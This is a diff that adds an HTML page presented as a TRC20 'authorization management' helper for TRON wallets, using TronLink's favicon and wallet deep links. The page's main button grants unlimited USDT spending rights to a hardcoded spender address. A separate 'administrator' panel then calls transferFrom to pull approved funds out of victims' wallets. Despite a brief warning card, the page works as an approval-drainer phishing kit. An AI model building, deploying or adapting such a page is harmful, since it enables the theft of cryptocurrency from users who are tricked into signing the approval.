@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRC20 授權管理助手 (Universal Wallet)</title>
+    <link rel="icon" href="https://www.tronlink.org/favicon.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- 引入 TronWeb SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .gradient-text { background: linear-gradient(90deg, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .wallet-blue { background-color: #2563eb; }
+        
+        /* 隱藏/顯示邏輯 */
+        .mobile-only { display: none; }
+        @media (max-width: 768px) { .mobile-only { display: flex; } }
+
+        /* 彈窗樣式 */
+        #walletModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 50; align-items: center; justify-content: center; backdrop-filter: blur(4px); }
+        .modal-content { width: 90%; max-width: 400px; background: #1e293b; border-radius: 24px; padding: 24px; border: 1px solid rgba(255,255,255,0.1); }
+        .wallet-option { width: 100%; display: flex; items-center: center; gap: 12px; padding: 16px; border-radius: 16px; background: rgba(255,255,255,0.05); margin-bottom: 12px; transition: all 0.2s; }
+        .wallet-option:hover { background: rgba(255,255,255,0.1); transform: translateY(-2px); }
+        .wallet-icon { width: 32px; height: 32px; border-radius: 8px; }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-6">
+
+    <!-- 錢包選擇彈窗 -->
+    <div id="walletModal">
+        <div class="modal-content shadow-2xl">
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="text-xl font-bold text-white">選擇錢包</h3>
+                <button onclick="closeModal()" class="text-slate-400 hover:text-white">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
+                    </svg>
+                </button>
+            </div>
+            
+            <div class="space-y-3">
+                <button onclick="tryDeepLink('tronlink')" class="wallet-option">
+                    <div class="w-8 h-8 bg-red-500 rounded-lg flex items-center justify-center text-[10px] font-bold text-white">TRON</div>
+                    <div class="text-left">
+                        <div class="font-semibold text-white">TronLink</div>
+                        <div class="text-xs text-slate-400">官方波場錢包</div>
+                    </div>
+                </button>
+                
+                <button onclick="tryDeepLink('imtoken')" class="wallet-option">
+                    <div class="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center text-[10px] font-bold text-white">im</div>
+                    <div class="text-left">
+                        <div class="font-semibold text-white">imToken</div>
+                        <div class="text-xs text-slate-400">支援 TRC20 轉帳</div>
+                    </div>
+                </button>
+                
+                <button onclick="tryDeepLink('tokenpocket')" class="wallet-option">
+                    <div class="w-8 h-8 bg-blue-400 rounded-lg flex items-center justify-center text-[10px] font-bold text-white">TP</div>
+                    <div class="text-left">
+                        <div class="font-semibold text-white">TokenPocket</div>
+                        <div class="text-xs text-slate-400">多鏈錢包</div>
+                    </div>
+                </button>
+
+                <button onclick="connectInApp()" class="wallet-option border border-blue-500/30">
+                    <div class="w-8 h-8 flex items-center justify-center bg-blue-500/20 rounded-lg text-blue-400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                            <path d="M11 3a1 1 0 10-2 0v1a1 1 0 102 0V3zM5.884 6.607a1 1 0 011.414 0l.707.707a1 1 0 11-1.414 1.414l-.707-.707a1 1 0 010-1.414zm2.12 10.505a1 1 0 00-1.413 1.414l.707.707a1 1 0 101.414-1.414l-.707-.707zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zM12.934 14.116a1 1 0 010 1.414l-.707.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zM14.116 5.884a1 1 0 011.414 0l.707.707a1 1 0 11-1.414 1.414l-.707-.707a1 1 0 010-1.414zM3 11a1 1 0 100-2H2a1 1 0 100 2h1z" />
+                        </svg>
+                    </div>
+                    <div class="text-left">
+                        <div class="font-semibold text-white">直接連接</div>
+                        <div class="text-xs text-slate-400">已在錢包瀏覽器中開啟</div>
+                    </div>
+                </button>
+            </div>
+            <p class="mt-4 text-[10px] text-slate-500 text-center">如果已在錢包 App 內，請選擇「直接連接」</p>
+        </div>
+    </div>
+
+    <div class="max-w-lg w-full glass rounded-3xl p-8 shadow-2xl border-t-4 border-blue-600">
+        <!-- Header -->
+        <div class="text-center mb-8">
+            <h1 class="text-3xl font-bold gradient-text mb-2">TRC20 授權管理</h1>
+            <p class="text-slate-400 text-sm">支援所有主流波場錢包 (OKX, TokenPocket, Bitget...)</p>
+        </div>
+
+        <!-- Wallet Connection -->
+        <div id="walletSection" class="mb-8">
+                <button id="connectBtn" class="w-full wallet-blue hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-xl transition-all flex items-center justify-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M17.707 9.293a1 1 0 010 1.414l-7 7a1 1 0 01-1.414 0l-7-7a1 1 0 011.414-1.414L10 14.586l6.293-6.293a1 1 0 011.414 0z" clip-rule="evenodd" />
+                    </svg>
+                    連接加密貨幣錢包
+                </button>
+                <div class="mt-4 flex justify-center gap-4 mobile-only">
+                    <button onclick="tryDeepLink('imtoken')" class="p-2 bg-slate-800 rounded-lg hover:bg-slate-700 transition-all flex flex-col items-center gap-1">
+                        <div class="w-6 h-6 bg-blue-500 rounded flex items-center justify-center text-[10px] font-bold text-white">im</div>
+                        <span class="text-[8px] text-slate-500">imToken</span>
+                    </button>
+                    <button onclick="tryDeepLink('tokenpocket')" class="p-2 bg-slate-800 rounded-lg hover:bg-slate-700 transition-all flex flex-col items-center gap-1">
+                        <div class="w-6 h-6 bg-blue-400 rounded flex items-center justify-center text-[10px] font-bold text-white">TP</div>
+                        <span class="text-[8px] text-slate-500">Pocket</span>
+                    </button>
+                    <button onclick="tryDeepLink('okx')" class="p-2 bg-slate-800 rounded-lg hover:bg-slate-700 transition-all flex flex-col items-center gap-1">
+                        <div class="w-6 h-6 bg-black rounded flex items-center justify-center text-[10px] font-bold text-white">OKX</div>
+                        <span class="text-[8px] text-slate-500">OKX</span>
+                    </button>
+                </div>
+            <p id="walletAddress" class="mt-3 text-center text-xs text-slate-500 hidden break-all"></p>
+        </div>
+
+        <!-- Form -->
+        <div id="approvalForm" class="space-y-6 opacity-50 pointer-events-none transition-opacity duration-300">
+            <div>
+                <label class="block text-sm font-medium text-slate-300 mb-2">1. 授權資產 (USDT 官方合約地址)</label>
+                <input type="text" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" placeholder="T..." class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500 transition-all">
+                <p class="text-[10px] text-slate-500 mt-1">這是 USDT 的官方管理中心，通常不需要修改。</p>
+            </div>
+
+            <div>
+                <label class="block text-sm font-medium text-slate-300 mb-2">2. 接收權限地址 (將獲得動用權的對象)</label>
+                <input type="text" id="spenderAddress" value="TRLP4sd9jvQKT2J2CgQLa1H75ScfXG1RBJ" placeholder="T..." class="w-full bg-slate-800/50 border border-slate-700 rounded-xl py-3 px-4 text-white focus:outline-none focus:ring-2 focus:ring-red-500 transition-all">
+                <p class="text-[10px] text-slate-500 mt-1">此地址在授權後，將可以從您的錢包轉走上述資產。</p>
+            </div>
+
+            <!-- Warning Card -->
+            <div class="bg-amber-900/20 border border-amber-500/30 rounded-xl p-4">
+                <div class="flex gap-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-amber-500 shrink-0" viewBox="0 0 20 20" fill="currentColor">
+                        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
+                    </svg>
+                    <div>
+                        <p class="text-amber-500 text-xs font-bold uppercase tracking-wider">安全警告</p>
+                        <p class="text-amber-200/80 text-xs mt-1">「TRC20 無限授權」將允許目標地址永久動用此代幣。請務必確認目標合約或地址是可信的。</p>
+                    </div>
+                </div>
+            </div>
+
+            <button id="approveBtn" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-bold py-4 px-6 rounded-xl shadow-lg shadow-red-500/20 transition-all active:scale-95 mb-4">
+                執行 TRC20 無限授權
+            </button>
+
+            <button id="checkBtn" class="w-full bg-slate-700 hover:bg-slate-600 text-white font-semibold py-3 px-6 rounded-xl transition-all active:scale-95">
+                查詢目前授權額度
+            </button>
+        </div>
+
+        <!-- Admin Section (transferFrom) -->
+        <div id="adminSection" class="mt-10 pt-8 border-t border-slate-700 opacity-50 pointer-events-none transition-opacity duration-300">
+            <div class="text-center mb-6">
+                <h2 class="text-xl font-bold text-indigo-400 mb-1">管理員操作區</h2>
+                <p class="text-slate-500 text-[10px]">當您身為「接收權限地址」時，可在此提取已授權的資產</p>
+            </div>
+
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">被授權人的地址 (From Address)</label>
+                    <input type="text" id="fromAddress" placeholder="T..." class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">接收資產的地址 (To Address)</label>
+                    <input type="text" id="toAddress" placeholder="T..." class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">提取數量 (Amount)</label>
+                    <input type="number" id="transferAmount" placeholder="100" class="w-full bg-slate-800/30 border border-slate-700/50 rounded-lg py-2 px-3 text-sm text-white focus:outline-none focus:ring-1 focus:ring-indigo-500">
+                </div>
+                <button id="transferBtn" class="w-full bg-indigo-600 hover:bg-indigo-500 text-white font-bold py-3 px-6 rounded-xl transition-all active:scale-95 shadow-lg shadow-indigo-500/20">
+                    執行提取 (transferFrom)
+                </button>
+            </div>
+        </div>
+
+        <!-- Status Messages -->
+        <div id="status" class="mt-6 text-center text-sm"></div>
+    </div>
+
+    <script>
+        let tronWeb;
+
+        const walletAddress = document.getElementById('walletAddress');
+        const approvalForm = document.getElementById('approvalForm');
+        const adminSection = document.getElementById('adminSection');
+        const walletModal = document.getElementById('walletModal');
+        const connectBtn = document.getElementById('connectBtn');
+        const approveBtn = document.getElementById('approveBtn');
+        const checkBtn = document.getElementById('checkBtn');
+        const transferBtn = document.getElementById('transferBtn');
+        const statusDiv = document.getElementById('status');
+
+        // 彈窗控制
+        function openModal() { walletModal.style.display = 'flex'; }
+        function closeModal() { walletModal.style.display = 'none'; }
+
+        // 深層連結跳轉邏輯
+        function tryDeepLink(walletType) {
+            const currentUrl = window.location.href;
+            const encodedUrl = encodeURIComponent(currentUrl);
+            let deepLink = "";
+
+            switch(walletType) {
+                case 'imtoken':
+                    deepLink = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+                    break;
+                case 'tokenpocket':
+                    deepLink = `tpdapp://open?params=${JSON.stringify({url: currentUrl})}`;
+                    break;
+                case 'tronlink':
+                    deepLink = `tronlinkback://app?url=${encodedUrl}`;
+                    break;
+                case 'okx':
+                    deepLink = `okx://wallet/dapp/details?dappUrl=${encodedUrl}`;
+                    break;
+            }
+
+            if (deepLink) {
+                showStatus(`正在嘗試開啟 ${walletType}...`, "text-indigo-400");
+                window.location.href = deepLink;
+                
+                // 如果幾秒後沒反應，提示使用者可能未安裝
+                setTimeout(() => {
+                    showStatus(`若未自動開啟，請確認已安裝該 App`, "text-amber-400");
+                }, 3000);
+            }
+        }
+
+        // 在 App 內直接連接
+        async function connectInApp() {
+            closeModal();
+            await connectWallet();
+        }
+
+        // 初始化與連接功能
+        async function connectWallet() {
+            // 嘗試偵測多個可能的波場錢包介面
+            const tron = window.tronWeb || (window.okxwallet && window.okxwallet.tronWeb) || (window.bitkeep && window.bitkeep.tronWeb);
+
+            if (!tron) {
+                showStatus("未偵測到相容的錢包，請確保已安裝 OKX, TokenPocket 或 TronLink 等插件", "text-amber-400");
+                return;
+            }
+
+            try {
+                showStatus("正在請求連接錢包...", "text-indigo-400");
+                
+                // 使用通用的請求帳戶方法
+                let address;
+                if (tron.request) {
+                    const res = await tron.request({ method: 'tron_requestAccounts' });
+                    if (res && res.code === 200) {
+                        address = tron.defaultAddress.base58;
+                    }
+                } else if (tron.defaultAddress && tron.defaultAddress.base58) {
+                    address = tron.defaultAddress.base58;
+                }
+                
+                if (address) {
+                    tronWeb = tron;
+                    updateUIConnected(address);
+                } else {
+                    showStatus("無法取得錢包地址，請確認錢包已解鎖並同意連接", "text-red-400");
+                }
+            } catch (err) {
+                console.error("Connection Error:", err);
+                showStatus("連接發生錯誤: " + (err.message || "未知錯誤"), "text-red-400");
+            }
+        }
+
+        function updateUIConnected(address) {
+            walletAddress.innerText = `已連接錢包地址: ${address}`;
+            walletAddress.classList.remove('hidden');
+            connectBtn.innerText = "錢包已連接";
+            connectBtn.classList.remove('wallet-blue');
+            connectBtn.classList.add('bg-emerald-600', 'hover:bg-emerald-500');
+            
+            approvalForm.classList.remove('opacity-50', 'pointer-events-none');
+            adminSection.classList.remove('opacity-50', 'pointer-events-none');
+            showStatus("已成功連接錢包網絡", "text-emerald-400");
+        }
+
+        // 綁定點擊事件
+        connectBtn.addEventListener('click', () => {
+            // 如果是在手機瀏覽器中，先顯示選擇彈窗
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                // 如果已經注入了 tronWeb (代表已在錢包 App 內)，直接連接
+                if (window.tronWeb) {
+                    connectWallet();
+                } else {
+                    openModal();
+                }
+            } else {
+                // 桌機版直接連接
+                connectWallet();
+            }
+        });
+
+        // 執行 TRC20 授權
+        approveBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const spenderAddr = document.getElementById('spenderAddress').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !spenderAddr.startsWith('T')) {
+                showStatus("請輸入有效的波場 (T 開頭) 地址", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在請求授權，請在 TronLink 中確認...", "text-red-400");
+                
+                // 獲取代幣合約實例
+                const contract = await tronWeb.contract().at(tokenAddr);
+                
+                // TRC20 無限額度 (2^256 - 1)
+                // TronWeb 中通常使用大數或字符串表示
+                const infiniteAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+
+                // 調用 approve 函數
+                const transaction = await contract.approve(spenderAddr, infiniteAmount).send({
+                    feeLimit: 100000000 // 設定費用上限
+                });
+
+                showStatus("交易已發送，交易 ID: " + transaction.substring(0, 10) + "...", "text-indigo-400");
+                
+                // Tron 的確認通常很快，可以提示用戶去區塊瀏覽器查看
+                showStatus("🎉 授權指令已發送！請檢查錢包記錄確認結果。", "text-emerald-400 font-bold");
+            } catch (err) {
+                showStatus("操作失敗: " + (err.message || err), "text-red-400");
+                console.error(err);
+            }
+        });
+
+        // 查詢授權額度
+        checkBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const spenderAddr = document.getElementById('spenderAddress').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !spenderAddr.startsWith('T')) {
+                showStatus("請輸入有效的波場地址以供查詢", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在查詢中...", "text-indigo-400");
+                const contract = await tronWeb.contract().at(tokenAddr);
+                const ownerAddr = tronWeb.defaultAddress.base58;
+                
+                const allowance = await contract.allowance(ownerAddr, spenderAddr).call();
+                // 處理 BigNumber
+                const amount = allowance.remaining ? allowance.remaining.toString() : allowance.toString();
+                
+                if (amount === "0") {
+                    showStatus("目前授權額度為 0", "text-amber-400");
+                } else if (amount.length > 20) {
+                    showStatus("目前為「無限授權」狀態", "text-emerald-400 font-bold");
+                } else {
+                    showStatus(`目前授權額度: ${amount}`, "text-emerald-400");
+                }
+            } catch (err) {
+                showStatus("查詢失敗: " + (err.message || err), "text-red-400");
+            }
+        });
+
+        // 執行管理員轉帳 (transferFrom)
+        transferBtn.addEventListener('click', async () => {
+            const tokenAddr = document.getElementById('tokenAddress').value.trim();
+            const fromAddr = document.getElementById('fromAddress').value.trim();
+            const toAddr = document.getElementById('toAddress').value.trim();
+            const amount = document.getElementById('transferAmount').value.trim();
+
+            if (!tokenAddr.startsWith('T') || !fromAddr.startsWith('T') || !toAddr.startsWith('T') || !amount) {
+                showStatus("請填寫完整的轉帳資訊", "text-red-400");
+                return;
+            }
+
+            try {
+                showStatus("正在請求提取資產...", "text-indigo-400");
+                const contract = await tronWeb.contract().at(tokenAddr);
+                
+                // 處理精度 (USDT 通常是 6 位小數)
+                // 為了簡單起見，這裡直接使用整數或由用戶輸入
+                const sunAmount = amount * 1000000; // 假設是 USDT
+
+                const transaction = await contract.transferFrom(fromAddr, toAddr, sunAmount).send({
+                    feeLimit: 100000000
+                });
+
+                showStatus("提取指令已發送！交易 ID: " + transaction.substring(0, 10) + "...", "text-emerald-400 font-bold");
+            } catch (err) {
+                showStatus("提取失敗: " + (err.message || err), "text-red-400");
+                console.error(err);
+            }
+        });
+
+        function showStatus(msg, colorClass) {
+            statusDiv.className = `mt-6 text-center text-sm ${colorClass}`;
+            statusDiv.innerText = msg;
+        }
+
+        // 定期檢查 TronLink 狀態
+        const checkTronLink = setInterval(() => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                // 如果已經授權過，自動連接
+                if (!tronWeb) {
+                    tronWeb = window.tronWeb;
+                    updateUIConnected(tronWeb.defaultAddress.base58);
+                }
+                clearInterval(checkTronLink);
+            }
+        }, 1000);
+
+        // 五秒後如果還沒偵測到也停止檢查，避免浪費資源
+        setTimeout(() => clearInterval(checkTronLink), 5000);
+    </script>
+</body>
+</html>
